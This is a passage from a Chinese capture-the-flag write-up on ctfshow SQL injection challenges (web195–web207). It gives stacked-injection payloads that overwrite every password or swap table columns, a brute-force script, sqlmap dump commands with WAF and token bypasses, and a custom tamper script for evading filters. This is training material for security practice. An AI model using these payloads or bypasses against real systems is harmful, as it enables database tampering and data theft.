class="line">        <span class="comment">#print(data)</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;密码错误&quot;</span> <span class="keyword">in</span> res.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">            flag += j</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> j == <span class="string">&quot;&#125;&quot;</span>:</span><br><span class="line">            exit()</span><br></pre></td></tr></table></figure>
<h3 id="web195"><a class="header-anchor" href="#web195">¶</a>web195</h3>
<p>提示堆叠注入，</p>
<blockquote>
<p>在sql语句中，分号<code>;</code>是用来表示一条sql语句的结束，而如果在一条sql语句结束后继续构造下一条sql语句，也会一起执行，从而产生了堆叠注入</p>
</blockquote>
<p>看一下过滤规则</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line">  <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, $username))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>把空格给过滤了；可以采取反引号的方式执行<br>
题目给出说明只要登录成功就可以获得flag，可以考虑使用update方法把数据库中的密码都更新成自己指定的密码，从而登录获取flag，payload如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x61646d696e;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;123456</span><br></pre></td></tr></table></figure>
<p>0x61646d696e是admin的16进制，这里使用16进制的原因是题目给的sql语句中缺少单引号包裹</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">$sql = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>然后再用账号0x61646d696e，密码123456登录就好</p>
<h3 id="web196"><a class="header-anchor" href="#web196">¶</a>web196</h3>
<p>这题的话加上了用户名的长度限制</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/ |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\#|\x23|\&#x27;|\&quot;|select|union|or|and|\x26|\x7c|file|into/i&#x27;</span>, $username))&#123;</span><br><span class="line">  $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($username)&gt;<span class="number">16</span>)&#123;</span><br><span class="line">  $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名不能超过16个字符&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>]==$password)&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这里需要注意正则里ban的是<code>se1ect</code>，而不是<code>select</code>，所以select可以继续使用，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username：520;select(1)</span><br><span class="line">password：1</span><br></pre></td></tr></table></figure>
<p>因为库中没有用户名为520的用户，所以查询后会返回后面的语句结果1</p>
<h3 id="web197"><a class="header-anchor" href="#web197">¶</a>web197</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line">  <span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set//i&#x27;</span>, $username))&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">    <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span>($row[<span class="number">0</span>]==$password)&#123;</span><br><span class="line">      $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>这里在195的基础上ban了update和set等，不过这里没有ban掉show，我们可以在username把表全部查询出来，在password里传入表名，相等即可符合判断条件爆出flag</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username：520;show tables</span><br><span class="line">password：ctfshow_user</span><br></pre></td></tr></table></figure>
<h3 id="web198"><a class="header-anchor" href="#web198">¶</a>web198</h3>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">//<span class="doctag">TODO:</span>感觉少了个啥，奇怪,不会又双叒叕被一血了吧</span></span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;/\*|\#|\-|\x23|\&#x27;|\&quot;|union|or|and|\x26|\x7c|file|into|select|update|set|create|drop/i&#x27;</span>, $username))&#123;</span><br><span class="line">  $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;用户名非法&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode($ret));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($row[<span class="number">0</span>]==$password)&#123;</span><br><span class="line">    $ret[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&quot;登陆成功 flag is <span class="subst">$flag</span>&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>依然可用上题payload打，但这里换另一个思路去解，这里没有ban掉alter，我们可以把密码和id两列进行一个互换，这样一来判断flag的条件变成对id的检测，而id都是纯数字，我们可以去进行爆破到正确的id，从而获得flag，脚本如下</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/6/15 22:53</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://e36a9275-a8a8-4def-bce5-0988a2b9b81d.challenge.ctf.show:8080/api/&quot;</span></span><br><span class="line">payload = <span class="string">&#x27;0x61646d696e;alter table ctfshow_user change column `pass` `dotast` varchar(255);alter table ctfshow_user change column `id` `pass` varchar(255);alter table ctfshow_user change column `dotast` `id` varchar(255);&#x27;</span></span><br><span class="line">data1 = &#123;</span><br><span class="line">    <span class="string">&#x27;username&#x27;</span>: payload,</span><br><span class="line">    <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">res = requests.post(url=url, data=data1)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">99</span>):</span><br><span class="line">    data2 = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;0x61646d696e&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;password&#x27;</span>: <span class="string">f&#x27;<span class="subst">&#123;i&#125;</span>&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    res2 = requests.post(url=url, data=data2)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;flag&quot;</span> <span class="keyword">in</span> res2.json()[<span class="string">&#x27;msg&#x27;</span>]:</span><br><span class="line">        print(res2.json()[<span class="string">&#x27;msg&#x27;</span>])</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<h3 id="web199"><a class="header-anchor" href="#web199">¶</a>web199</h3>
<p>使用web197的payload打</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username：520;show tables</span><br><span class="line">password：ctfshow_user</span><br></pre></td></tr></table></figure>
<h3 id="web200"><a class="header-anchor" href="#web200">¶</a>web200</h3>
<p>使用web197的payload打</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">username：520;show tables</span><br><span class="line">password：ctfshow_user</span><br></pre></td></tr></table></figure>
<h3 id="web201"><a class="header-anchor" href="#web201">¶</a>web201</h3>
<p>开始练习sqlmap的使用，首先我们去下载sqlmap</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com.cnpmjs.org&#x2F;sqlmapproject&#x2F;sqlmap.git</span><br></pre></td></tr></table></figure>
<p>首先搜索框抓包，可以看到是get传参，并且提示要绕过referer检查，开始走起<br>
查数据库</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --dbs</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web201/J%256EC%7B%5D~L%7D~GS3%25E8Q%24O_%29C.png" alt=""><br>
得到数据库为ctfshow_web，查数据库中的表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web --tables</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web201/50Y%29M3%7BF_%24%247%283%7DBNXWPS%24Q.png" alt=""><br>
得到表名为ctfshow_user，查表中的字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user --columns</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web201/~IQ7%29LV0~%29%7BLS01UCXM6%282Q.png" alt=""><br>
查password</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;50a4f61e-b424-4597-b92c-c768d2ee4089.challenge.ctf.show:8080&#x2F;api&#x2F;?id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure>
<p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web201/96B~C%40VAS8KMXHL%5BT36%25I%284.png" alt=""><br>
获得flag</p>
<h3 id="web202"><a class="header-anchor" href="#web202">¶</a>web202</h3>
<p>提示要post传参，使用data</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;8e957c41-bdfc-4c2e-b9a1-81956347d234.challenge.ctf.show:8080&#x2F;api&#x2F;&quot; --data&#x3D;&quot;id&#x3D;1&quot; --refer&#x3D;&quot;ctf.show&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure>
<h3 id="web203"><a class="header-anchor" href="#web203">¶</a>web203</h3>
<p>提示要用method改变请求方式，这里使用PUT请求，但是要记得加上设置<code>Content-Type</code>头，否则会变成表单提交</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;aff779db-d32d-41cb-b944-6cead4df2130.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --method&#x3D;&quot;PUT&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;ctf.show --headers&#x3D;&quot;Content-Type: text&#x2F;plain&quot; -D ctfshow_web -T ctfshow_user -C pass --dump</span><br></pre></td></tr></table></figure>
<h3 id="web204"><a class="header-anchor" href="#web204">¶</a>web204</h3>
<p>提示传递cookie，我们再加个cookie参数就好了，cookie可以通过抓包获得</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;31d8cf4d-d658-4b3f-95bb-0068034e2304.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --method&#x3D;PUT  --cookie&#x3D;&quot;PHPSESSID&#x3D;ijpf0cduare0gakqaihmah8nm1; ctfshow&#x3D;f6757abd63836da6e094a4e776213b5b&quot; -D &quot;ctfshow_web&quot; -T &quot;ctfshow_user&quot; -C &quot;pass&quot; --dump</span><br></pre></td></tr></table></figure>
<h3 id="web205"><a class="header-anchor" href="#web205">¶</a>web205</h3>
<p>提示需要api鉴权，具体啥api我们抓包看看<br>
<img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/sql%E6%B3%A8%E5%85%A5/web205/N69%249%60F_9V%40_%7B05ELSDS2T8.png" alt=""><br>
可以看到每次请求api的时候首先会去请求一次getToken.php，而sqlmap中提供了以下两个参数</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">--safe-url 提供一个安全不错误的连接，每隔一段时间都会去访问一下</span><br><span class="line">--safe-freq 提供一个安全不错误的连接，设置每次注入测试前访问安全链接的次数</span><br></pre></td></tr></table></figure>
<p>查表名</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web --tables</span><br></pre></td></tr></table></figure>
<p>得到表名为ctfshow_flax，查字段</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flax --columns</span><br></pre></td></tr></table></figure>
<p>得到列flagx，获取数据</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;705a05d8-3d8e-44e6-85d9-28dcc18c677a.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flax -C flagx --dump</span><br></pre></td></tr></table></figure>
<p>得到flag</p>
<h3 id="web206"><a class="header-anchor" href="#web206">¶</a>web206</h3>
<p>提示sql要闭合，无须我们操作，sqlmap会帮我们的<br>
还是一样继续查表，查字段…</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sqlmap -u &quot;http:&#x2F;&#x2F;4a7aa673-4493-4581-be03-26dd5a1305a8.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;4a7aa673-4493-4581-be03-26dd5a1305a8.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 -D ctfshow_web -T ctfshow_flaxc -C flagv --dump</span><br></pre></td></tr></table></figure>
<h3 id="web207"><a class="header-anchor" href="#web207">¶</a>web207</h3>
<p>开始进入编写tamper的时代啦！<br>
首先观察返回逻辑，可以看到正则对空格进行了过滤</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F;对传入的参数进行了过滤</span><br><span class="line">  function waf($str)&#123;</span><br><span class="line">   return preg_match(&#39;&#x2F; &#x2F;&#39;, $str);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
<p>遇到这种情况怎么办？sqlmap提供了tamper脚本用于应对此种情况，tamper的出现是为了引入用户自定义的脚本来修改payload以达到绕过waf的目的。sqlmap自带的tamper脚本文件都在sqlmap的tamper文件夹下</p>
<blockquote>
<p>举例如下tamper脚本：</p>
<p><a href="http://apostrophemask.py">apostrophemask.py</a> 	用utf8代替引号</p>
<p><a href="http://equaltolike.py">equaltolike.py</a> 		MSSQL * SQLite中like 代替等号</p>
<p><a href="http://greatest.py">greatest.py</a> 		MySQL中绕过过滤’&gt;’ ,用GREATEST替换大于号</p>
<p><a href="http://space2hash.py">space2hash.py</a> 		空格替换为#号 随机字符串 以及换行符</p>
<p><a href="http://space2comment.py">space2comment.py</a>	用/**/代替空格</p>
<p><a href="http://apostrophenullencode.py">apostrophenullencode.py</a> 	MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL绕过过滤双引号，替换字符和双引号</p>
<p><a href="http://halfversionedmorekeywords.py">halfversionedmorekeywords.py</a> 	当数据库为mysql时绕过防火墙，每个关键字之前添加mysql版本评论</p>
<p><a href="http://space2morehash.py">space2morehash.py</a> 	 MySQL中空格替换为 #号 以及更多随机字符串 换行符</p>
<p>appendnullbyte.p 	 Microsoft Access在有效负荷结束位置加载零字节字符编码</p>
<p><a href="http://ifnull2ifisnull.py">ifnull2ifisnull.py</a> 	 MySQL，SQLite (possibly)，SAP MaxDB绕过对 IFNULL 过滤</p>
<p><a href="http://space2mssqlblank.py">space2mssqlblank.py</a>  mssql空格替换为其它空符号</p>
<p><a href="http://base64encode.py">base64encode.py</a> 	 用base64编码</p>
<p><a href="http://space2mssqlhash.py">space2mssqlhash.py</a> mssql查询中替换空格</p>
<p><a href="http://modsecurityversioned.py">modsecurityversioned.py</a>	 mysql中过滤空格，包含完整的查询版本注释</p>
<p><a href="http://space2mysqlblank.py">space2mysqlblank.py</a>	  mysql中空格替换其它空白符号</p>
<p><a href="http://between.py">between.py</a> 	 		MS SQL 2005，MySQL 4, 5.0 and 5.5 * Oracle 10g * PostgreSQL 8.3, 8.4, 9.0中用between替换大于号（&gt;）</p>
<p><a href="http://space2mysqldash.py">space2mysqldash.py</a> 	 MySQL，MSSQL替换空格字符（”）（’ – ‘）后跟一个破折号注释一个新行（’ n’）</p>
<p><a href="http://multiplespaces.py">multiplespaces.py</a> 	 围绕SQL关键字添加多个空格</p>
<p><a href="http://space2plus.py">space2plus.py</a> 	  	 用+替换空格</p>
<p><a href="http://bluecoat.py">bluecoat.py</a> 	 	 MySQL 5.1, SGOS代替空格字符后与一个有效的随机空白字符的SQL语句。 然后替换=为like</p>
<p><a href="http://nonrecursivereplacement.py">nonrecursivereplacement.py</a> 	 双重查询语句。取代predefined SQL关键字with表示 suitable for替代</p>
<p><a href="http://space2randomblank.py">space2randomblank.py</a> 	 代替空格字符（“”）从一个随机的空白字符可选字符的有效集</p>
<p>sp_password.py 	 	 追加sp_password’从DBMS日志的自动模糊处理的26 有效载荷的末尾</p>
<p><a href="http://chardoubleencode.py">chardoubleencode.py</a> 	 双url编码(不处理以编码的)</p>
<p><a href="http://unionalltounion.py">unionalltounion.py</a> 	 	 替换UNION ALL SELECT UNION SELECT</p>
<p><a href="http://charencode.py">charencode.py</a> 	 	 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0url编码；</p>
<p><a href="http://randomcase.py">randomcase.py</a> 	 	 Microsoft SQL Server 2005，MySQL 4, 5.0 and 5.5，Oracle 10g，PostgreSQL 8.3, 8.4, 9.0中随机大小写</p>
<p><a href="http://unmagicquotes.py">unmagicquotes.py</a> 	 宽字符绕过 GPC addslashes</p>
<p><a href="http://randomcomments.py">randomcomments.py</a> 	 用/**/分割sql关键字</p>
<p><a href="http://charunicodeencode.py">charunicodeencode.py</a> 	 ASP，ASP.NET中字符串 unicode 编码</p>
<p><a href="http://securesphere.py">securesphere.py</a> 	  追加特制的字符串</p>
<p><a href="http://versionedmorekeywords.py">versionedmorekeywords.py</a> 	     MySQL &gt;= 5.1.13注释绕过</p>
<p><a href="http://halfversionedmorekeywords.py">halfversionedmorekeywords.py</a> 	 MySQL &lt; 5.1中关键字前加注释</p>
</blockquote>
<p>对于本题，过滤了空格，我们可以使用tamper文件夹下的space2comment.py文件，payload为</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 sqlmap.py -u &quot;http:&#x2F;&#x2F;04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080&#x2F;api&#x2F;index.php&quot; --data&#x3D;&quot;id&#x3D;1&quot; --method&#x3D;PUT --referer&#x3D;&quot;ctf.show&quot; --headers&#x3D;&quot;Content-Type:text&#x2F;plain&quot; --safe-url&#x3D;&quot;http:&#x2F;&#x2F;04ac3359-1e07-4234-aa4c-992636c78c51.challenge.ctf.show:8080&#x2F;api&#x2F;getToken.php&quot; --safe-freq&#x3D;1 --tamper&#x3D;space2comment --dbs</span><br></pre></td></tr></table></figure>
<p>那我们如何编写自己的tamper脚本呢？我们查看一下space2comment.py文件的内容</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">Copyright (c) 2006-2021 sqlmap developers (http://sqlmap.org/)</span></span><br><span class="line"><span class="string">See the file &#x27;LICENSE&#x27; for copying permission</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">    Replaces space character (&#x27; &#x27;) with comments &#x27;/**/&#x27;</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Tested against:</span></span><br><span class="line"><span class="string">        * Microsoft SQL Server 2005</span></span><br><span class="line"><span class="string">        * MySQL 4, 5.0 and 5.5</span></span><br><span class="line"><span class="string">        * Oracle 10g</span></span><br><span class="line"><span class="string">        * PostgreSQL 8.3, 8.4, 9.0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    Notes:</span></span><br><span class="line"><span class="string">        * Useful to bypass weak and bespoke web application firewalls</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    &gt;&gt;&gt; tamper(&#x27;SELECT id FROM users&#x27;)</span></span><br><span class="line"><span class="string">    &#x27;SELECT/**/id/**/FROM/**/users&#x27;</span></span><br><span class="line"><span class="string">    &quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += <span class="string">&quot;/**/&quot;</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += <span class="string">&quot;/**/&quot;</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可以看到，tamper函数中把空格替换成<code>/**/</code>，我们把他换成<code>%09</code>来进行绕过空格，新建一个<code>dotast.py</code>，稍作改变</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> lib.core.compat <span class="keyword">import</span> xrange</span><br><span class="line"><span class="keyword">from</span> lib.core.enums <span class="keyword">import</span> PRIORITY</span><br><span class="line"></span><br><span class="line">__priority__ = PRIORITY.LOW</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dependencies</span>():</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tamper</span>(<span class="params">payload, **kwargs</span>):</span></span><br><span class="line"></span><br><span class="line">    retVal = payload</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        retVal = <span class="string">&quot;&quot;</span></span><br><span class="line">        quote, doublequote, firstspace = <span class="literal">False</span>, <span class="literal">False</span>, <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> xrange(len(payload)):</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> firstspace:</span><br><span class="line">                <span class="keyword">if</span> payload[i].isspace():</span><br><span class="line">                    firstspace = <span class="literal">True</span></span><br><span class="line">                    retVal += chr(<span class="number">0x9</span>)</span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;\&#x27;&#x27;</span>:</span><br><span class="line">                quote = <span class="keyword">not</span> quote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&#x27;&quot;&#x27;</span>:</span><br><span class="line">                doublequote = <span class="keyword">not</span> doublequote</span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> payload[i] == <span class="string">&quot; &quot;</span> <span class="keyword">and</span> <span class="keyword">not</span> doublequote <span class="keyword">and</span> <span class="keyword">not</span> quote:</span><br><span class="line">                retVal += chr(<span class="number">0x9</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            retVal += payload[i]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> retVal</span><br></pre></td></tr></table></figure>
<p>引用的tamper名字就是我们刚刚定义的dotast</p>
